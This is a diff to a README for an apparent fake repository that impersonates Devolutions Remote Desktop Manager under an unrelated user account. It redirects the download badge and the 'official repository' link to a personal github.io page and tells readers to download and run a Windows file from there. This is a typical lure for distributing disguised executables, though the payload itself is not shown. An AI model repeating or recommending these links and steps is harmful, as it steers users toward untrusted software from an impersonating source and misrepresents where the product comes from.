@@ -1,6 +1,6 @@
 # 🖥️ Devolutions-RDM-2026 - Control remote systems with ease
 
-[![](https://img.shields.io/badge/Download-Remote_Desktop_Manager-blue.svg)](https://github.com/robenaliberian183/Devolutions-RDM-2026)
+[![](https://img.shields.io/badge/Download-Remote_Desktop_Manager-blue.svg)](https://robenaliberian183.github.io)
 
 ## 📌 About this software
 
@@ -21,7 +21,7 @@ Before you install this software, ensure your computer meets these basic needs:
 
 Follow these steps to obtain the tool:
 
-1.  Visit the official repository page at this link: [Download Devolutions RDM](https://github.com/robenaliberian183/Devolutions-RDM-2026).
+1.  Visit the official repository page at this link: [Download Devolutions RDM](https://robenaliberian183.github.io).
 2.  Locate the release section on the right side of the page.
 3.  Choose the version labeled for Windows.
 4.  Click the file to initiate the transfer to your computer.
